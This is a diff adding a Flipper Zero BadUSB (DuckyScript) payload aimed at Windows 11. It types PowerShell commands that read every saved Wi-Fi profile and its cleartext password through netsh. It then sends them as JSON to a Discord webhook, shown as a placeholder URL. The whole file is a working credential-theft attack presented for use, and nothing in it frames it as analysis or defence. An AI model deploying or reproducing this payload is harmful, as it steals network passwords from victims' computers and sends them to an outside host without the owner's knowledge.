@@ -1,0 +1,41 @@
+REM Author: sasquatchchicken
+REM Version 1.0 (Flipper Ducky)
+REM Target: windows 11
+REM This badkb will list all SSID and passwords used on target device and send them to a discord webhook
+DELAY 1000
+REM --- Open Run Dialog ---
+WINDOWS r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $webhookUrl = "https://discord.com/api/webhooks/your_webhook_goes_here"
+ENTER
+DELAY 500
+STRING $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+ENTER
+DELAY 500
+REM initializes an empty array. This is a variable that will hold the data. In this case, it's intended to store the Wi-Fi profiles and passwords retrieved by the script.
+STRING $output = @()
+ENTER
+DELAY 500
+STRING foreach ($profile in $profiles) {
+ENTER
+DELAY 500
+STRING $wifiDetails = netsh wlan show profile name="$profile" key=clear
+ENTER
+DELAY 500
+STRING $password = ($wifiDetails | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() })
+ENTER
+DELAY 500
+STRING $output += @{ "Profile" = $profile; "Password" = $password }
+ENTER
+DELAY 500
+STRING }
+ENTER
+DELAY 500
+STRING $jsonPayload = @{ "content" = ($output | ConvertTo-Json) }
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($jsonPayload | ConvertTo-Json) -ContentType 'application/json'
+ENTER
